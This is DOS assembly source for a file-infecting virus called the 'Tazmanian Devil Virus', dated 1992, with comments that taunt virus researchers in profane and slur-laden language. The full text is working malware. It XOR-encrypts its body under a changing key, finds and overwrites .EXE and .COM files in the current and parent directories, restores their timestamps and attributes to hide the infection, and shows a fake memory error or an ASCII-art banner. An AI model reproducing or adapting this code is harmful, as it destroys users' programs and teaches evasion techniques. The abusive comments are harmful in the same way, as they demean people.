cr              equ     13              ;  This VIRUS was written 12-14-1992
lf              equ     10              ;  AND QUIT READING MY SOURCE CODE
tab             equ     9               ;  YOU SHITHEAD FUCKNOSE DOUCHE BAG
virus_size      equ     2276            ;  QUEERBAIT VIRUS TRACKER WANNA-BE!
code_start      equ     100h            ;  Address right after PSP in memory
dta             equ     80h             ;  Addr of default disk transfer area
datestamp       equ     24              ;  Offset in DTA of file's date stamp
timestamp       equ     22              ;  Offset in DTA of file's time stamp
filename        equ     30              ;  Offset in DTA of ASCIIZ filename
attribute       equ     21              ;  Offset in DTA of file attribute


        code    segment 'code'          ;  Open code segment
        assume  cs:code,ds:code         ;  One segment for both code & data
                org     code_start      ;  Start code image after PSP

;---------------------------------------------------------------------
;  All executable code is contained in boundaries of procedure "main".
;  The following code, until the start of "virus_code", is the non-
;  encrypted CMT portion of the code to load up the real program.
;---------------------------------------------------------------------
main    proc    near                    ;  Code execution begins here
        call    encrypt_decrypt         ;  Decrypt the real virus code
        jmp     random_mutation         ;  Put the virus into action

encrypt_val     db      00h             ;  Hold value to encrypt by here

; ----------  Encrypt, save, and restore the virus code  -----------
infect_file:
        mov     bx,handle               ;  Get the handle
        push    bx                      ;  Save it on the stack
        call    encrypt_decrypt         ;  Encrypt most of the code
        pop     bx                      ;  Get back the handle
        mov     cx,virus_size           ;  Total number of bytes to write
        mov     dx,code_start           ;  Buffer where code starts in memory
        mov     ah,40h                  ;  DOS write-to-handle service
        int     21h                     ;  Write the virus code into the file
        call    encrypt_decrypt         ;  Restore the code as it was
        ret                             ;  Go back to where you came from

; ---------------  Encrypt or decrypt the virus code  ----------------
encrypt_decrypt:
        mov     bx,offset virus_code    ;  Get address to start encrypt/decrypt
xor_loop:                               ;  Start cycle here
        mov     ah,[bx]                 ;  Get the current byte
        xor     ah,encrypt_val          ;  Engage/disengage XOR scheme on it
        mov     [bx],ah                 ;  Put it back where we got it
        inc     bx                      ;  Move BX ahead a byte
        cmp     bx,offset virus_code+virus_size  ;  Are we at the end?
        jle     xor_loop                ;  If not, do another cycle
        ret                             ;  and go back where we came from

;-----------------------------------------------------------------------
;   The rest of the code from here on remains encrypted until run-time,
;   using a fundamental XOR technique that changes via CMT.
;-----------------------------------------------------------------------
virus_code:

;----------------------------------------------------------------------------
;  All strings are kept here in the file, and automatically encrypted.
;  Please don't be a lamer and change the strings and say you wrote a virus.
;  Because of Cybernetic Mutation Technology(tm), the CRC of this file often
;  changes, even when the strings stay the same.
;----------------------------------------------------------------------------
exe_filespec    db      "*.EXE",0
com_filespec    db      "*.COM",0
newdir          db      "..",0
fake_msg        db      cr,lf,"Program too big to fit in memory $"
virus_msg1      db      cr,lf,"*TAKE THE DAY OFF COMPLIMENTS OF THE TAZMANIAN DEVIL AND ¬√¥ê Wêísàl!!*  $"
virus_msg2      db      cr,lf,"ADH ADH ADH ADH ADH ADH‹‹‹ﬂ‹€€€‹ADH ADH ADH ADH ADH ADH ADH ADH ADH ADH  $" 
virus_msg3      db      cr,lf,"ADH ADH ADH ADH ADH A‹€ﬂ‹ﬂ€ﬂ‹ﬂ€€‹€‹ ADH ADH ADH ADH ADH ADH ADH ADH ADH  $"
virus_msg4      db      cr,lf,"ADH ADH ADH ADH ADH ‹€ €€› €€›ﬁ€€€ﬂ‹€€‹‹‹DH ADH ADH €€€€€  €€  €€€€€ADH  $"
virus_msg5      db      cr,lf,"ADH ADH ADH ADﬂ€€‹ﬂﬂ€›ﬁ€€›ﬁ€€› €€ﬂ‹‹‹‹ﬂ€‹‹‹ ADH ADH AD€ AD€ A€H AD€ ADH  $"
virus_msg6      db      cr,lf,"ADH ADH ADH A€€€€ﬂﬂ€‹ﬂ‹ﬂ›   ﬂﬂ ‹‹€€€€€€ €€€€ﬂﬂH ADH AD€ AD€€€€H A€H ADH  $"
virus_msg7      db      cr,lf,"ADH ADH ADH ﬂ€€ﬂ‹€€‹‹ﬂ     ‹‹ ﬂ€€€ﬂﬂﬂ€€€ €€€€‹ ‹ADH AD€ AD€ A€H €DH ADH  $" 
virus_msg8      db      cr,lf,"ADH ADH ADH‹ €ﬁ›ﬁ€‹‹ ‹€‹      ‹€€€€ﬂ ‹ﬂ€›ﬁ€€€€€‹€‹H AD€ AD€ A€H€€€€€ADH  $" 
virus_msg9      db      cr,lf,"ADH ADH AD€€€‹ﬁ€ €€€€‹ﬂﬂ€€ €€€€€€ﬂ‹ﬂ‹€€€€ €€€€€€€€€‹ADH ADH ADH ADH ADH  $" 
virus_msg10     db      cr,lf,"ADH ADH A€€€€€ €€ €€€€ﬂ‹‹ €‹ﬂﬂﬂ‹‹ﬂ €€€€€€ €€€€€€€€€€€DH ADH ADH ADH ADH  $" 
virus_msg11     db      cr,lf,"ADH ADH €€€€€€€ €€ €€€‹ﬂ› €€€€ ﬁﬂ €€€€€€€ €€ﬂﬂ€€€€€€€€‹ ADH ADH ADH ADH$" 
virus_msg12     db      cr,lf,"ADH ADH‹€‹ﬂ€€ﬂﬂﬂ €€ €€€€‹ €€€€ﬂ‹‹ﬁ€€€€€€›ﬁ€€A‹‹€€€€€€€€‹ADH ADH ADH ADH$" 
virus_msg13     db      cr,lf,"ADH AD€€‹‹€€€›H AD€€ €€€€ €ﬂﬂﬂﬁ€›€€€€€€€ €€ €€€ﬂ€€€€€€€€€›H ADH ADH ADH$" 
virus_msg14     db      cr,lf,"ADH ADﬁ€‹ﬂ€€€€€€ADH€‹ﬂ‹€€  ‹ﬁ›ﬁ€ €€ﬂ€€€ €€› Aﬂﬂ ‹€€€€€›ﬂﬂDH ADH ADH ADH$" 
virus_msg15     db      cr,lf,"ADH ADHﬂﬂ‹€‹‹ﬂﬂ ADH ﬂﬁ€ﬂ‹›ﬁﬁ€›ﬁ€€‹ﬂ €ﬂ‹€€ﬂH ADH€€€›ﬁ€€€ ADH ADH ADH ADH$" 
virus_msg16     db      cr,lf,"ADH ADH ADH ADH‹€€€€€€‹ﬂﬂ€€ €€€€€€€€€€‹ €€€€€‹H ADH ADH ADH ADH AHD ADH$" 
virus_msg17     db      cr,lf,"ADH ADH ADH ADﬂ€€€€€ﬂﬂﬂ ADH ﬂﬂ€€€€€€€€Hﬂ€€€€€€‹ ADH ADH ADH ADH ADH ADH$" 
virus_msg18     db      cr,lf,"ADH ‹‹€€€‹‹ ADH ﬂ€€€€‹H ADH ADﬂﬂﬂﬂﬂﬂﬂDH ‹€€€€€€€ADH ADH ADH ADH ADH ADH$" 
virus_msg19     db      cr,lf,"AD‹ﬂ‹‹€€€€€€€€€‹‹‹€€€€€‹ADH ADH ADH A‹‹€€€€€€ﬂﬂ‹‹‹‹€€€€‹‹DH ADH ADH ADH$" 
virus_msg20     db      cr,lf,"‹ﬂ‹€€ﬂ‹‹€€€€€€€€€€€€€€€€€DH ADH ADH ﬂ€€€€€€‹‹€€€€€ﬂﬂ€€€€‹ﬂ‹ ADH ADH ADH$" 
virus_msg21     db      cr,lf,"A€€€›ﬁ€€€€€€€€€€€€€€€ﬂﬂﬂADH ADH ADH ADHﬂ€€€€€€€€€€€€‹‹ﬂ€€›ﬁ ADH ADH ADH$" 
virus_msg22     db      cr,lf,"ADﬂﬂ ﬂ€€€€€ﬂﬂﬂﬂﬂﬂDH ADH ADH ADH ADH ADH ADﬂﬂ€€€€€€€€€€€ €€› ADH ADH ADH$" 
virus_msg23     db      cr,lf,"The Tazmanian Devil Virus (TAZ!) - Released 12-14-1992 - Sector Infector$" 
compare_buf     db      20 dup (?)      ;  Buffer to compare files in
files_found     db      ?
files_infected  db      ?
orig_time       dw      ?
orig_date       dw      ?
orig_attr       dw      ?
handle          dw      ?
success         db      ?

random_mutation:                        ; First decide if virus is to mutate
        mov     ah,2ch                  ; Set up DOS function to get time
        int     21h
        cmp     encrypt_val,0           ; Is this a first-run virus copy?
        je      install_val             ; If so, install whatever you get.
        cmp     dh,15                   ; Is it less than 16 seconds?
        jg      find_extension          ; If not, don't mutate this time
install_val:
        cmp     dl,0                    ; Will we be encrypting using zero?
        je      random_mutation         ; If so, get a new value.
        mov     encrypt_val,dl          ; Otherwise, save the new value
find_extension:                         ; Locate file w/ valid extension
        mov     files_found,0           ; Count infected files found
        mov     files_infected,4        ; BX counts file infected so far
        mov     success,0
find_exe:
        mov     cx,00100111b            ; Look for all flat file attributes
        mov     dx,offset exe_filespec  ; Check for .EXE extension first
        mov     ah,4eh                  ; Call DOS find first service
        int     21h
        cmp     ax,12h                  ; Are no files found?
        je      find_com                ; If not, nothing more to do
        call    find_healthy            ; Otherwise, try to find healthy .EXE
find_com:
        mov     cx,00100111b            ; Look for all flat file attributes
        mov     dx,offset com_filespec  ; Check for .COM extension now
        mov     ah,4eh                  ; Call DOS find first service
        int     21h
        cmp     ax,12h                  ; Are no files found?
        je      chdir                   ; If not, step back a directory
        call    find_healthy            ; Otherwise, try to find healthy .COM
chdir:                                  ; Routine to step back one level
        mov     dx,offset newdir        ; Load DX with address of pathname
        mov     ah,3bh                  ; Change directory DOS service
        int     21h
        dec     files_infected          ; This counts as infecting a file
        jnz     find_exe                ; If we're still rolling, find another
        jmp     exit_virus              ; Otherwise let's pack it up
find_healthy:
        mov     bx,dta                  ; Point BX to address of DTA
        mov     ax,[bx]+attribute       ; Get the current file's attribute
        mov     orig_attr,ax            ; Save it
        mov     ax,[bx]+timestamp       ; Get the current file's time stamp
        mov     orig_time,ax            ; Save it
        mov     ax,[bx]+datestamp       ; Get the current file's data stamp
        mov     orig_date,ax            ; Save it
        mov     dx,dta+filename         ; Get the filename to change attribute
        mov     cx,0                    ; Clear all attribute bytes
        mov     al,1                    ; Set attribute sub-function
        mov     ah,43h                  ; Call DOS service to do it
        int     21h
        mov     al,2                    ; Set up to open handle for read/write
        mov     ah,3dh                  ; Open file handle DOS service
        int     21h
        mov     handle,ax               ; Save the file handle
        mov     bx,ax                   ; Transfer the handle to BX for read
        mov     cx,20                   ; Read in the top 20 bytes of file
        mov     dx,offset compare_buf   ; Use the small buffer up top
        mov     ah,3fh                  ; DOS read-from-handle service
        int     21h
        mov     bx,offset compare_buf   ; Adjust the encryption value
        mov     ah,encrypt_val          ; for accurate comparison
        mov     [bx+6],ah
        mov     si,code_start           ; One array to compare is this file
        mov     di,offset compare_buf   ; The other array is the buffer
        mov     ax,ds                   ; Transfer the DS register...
        mov     es,ax                   ; ...to the ES register
        cld
        repe    cmpsb                   ; Compare the buffer to the virus
        jne     healthy                 ; If different, the file is healthy!
        call    close_file              ; Close it up otherwise
        inc     files_found             ; Chalk up another fucked up file
continue_search:
        mov     ah,4fh                  ; Find next DOS function
        int     21h                     ; Try to find another same type file
        cmp     ax,12h                  ; Are there any more files?
        je      no_more_found           ; If not, get outta here
        jmp     find_healthy            ; If so, try the process on this one!
no_more_found:
        ret                             ; Go back to where we came from
healthy:
        mov     bx,handle               ; Get the file handle
        mov     ah,3eh                  ; Close it for now
        int     21h
        mov     ah,3dh                  ; Open it again, to reset it
        mov     dx,dta+filename
        mov     al,2
        int     21h
        mov     handle,ax               ; Save the handle again
        call    infect_file             ; Infect the healthy file
        call    close_file              ; Close down this operation
        inc     success                 ; Indicate we did something this time
        dec     files_infected          ; Scratch off another file on agenda
        jz      exit_virus              ; If we're through, terminate
        jmp     continue_search         ; Otherwise, try another
        ret
close_file:
        mov     bx,handle               ; Get the file handle off the stack
        mov     cx,orig_time            ; Get the date stamp
        mov     dx,orig_date            ; Get the time stamp
        mov     al,1                    ; Set file date/time sub-service
        mov     ah,57h                  ; Get/Set file date and time service
        int     21h                     ; Call DOS
        mov     bx,handle
        mov     ah,3eh                  ; Close handle DOS service
        int     21h
        mov     cx,orig_attr            ; Get the file's original attribute
        mov     al,1                    ; Instruct DOS to put it back there
        mov     dx,dta+filename         ; Feed it the filename
        mov     ah,43h                  ; Call DOS
        int     21h
        ret
exit_virus:
        cmp     files_found,2           ; Are at least 6 files infected?
        jl      print_fake              ; If not, keep a low profile
        cmp     success,0               ; Did we infect anything?
        jg      print_fake              ; If so, cover it up
        mov     ah,09h                  ; Use DOS print string service
        mov     dx,offset virus_msg1    ; Load the address of the first line
        int     21h                     ; Print it
        mov     dx,offset virus_msg2    ; Load the second line
        int     21h                     ; (etc)
        mov     dx,offset virus_msg3
        int     21h
        mov     dx,offset virus_msg4
        int     21h
        mov     dx,offset virus_msg5 
        int     21h
        mov     dx,offset virus_msg6
        int     21h
        mov     dx,offset virus_msg7
        int     21h
        mov     dx,offset virus_msg8
        int     21h
        mov     dx,offset virus_msg9
        int     21h
        mov     dx,offset virus_msg10
        int     21h
        mov     dx,offset virus_msg11
        int     21h
        mov     dx,offset virus_msg12
        int     21h
        mov     dx,offset virus_msg13
        int     21h
        mov     dx,offset virus_msg14
        int     21h
        mov     dx,offset virus_msg15
        int     21h
        mov     dx,offset virus_msg16
        int     21h
        mov     dx,offset virus_msg17
        int     21h
        mov     dx,offset virus_msg18
        int     21h
        mov     dx,offset virus_msg19
        int     21h
        mov     dx,offset virus_msg20
        int     21h
        mov     dx,offset virus_msg21
        int     21h
        mov     dx,offset virus_msg22
        int     21h
        mov     dx,offset virus_msg23
        int     21h
        jmp     terminate
print_fake:
        mov     ah,09h                  ; Use DOS to print fake error message
        mov     dx,offset fake_msg
        int     21h
terminate:
        mov     ah,4ch                  ; DOS terminate process function
        int     21h                     ; Call DOS to get out of this program

filler          db       8 dup (90h)    ; Pad out the file length to 666 bytes

main    endp
code    ends
        end     main
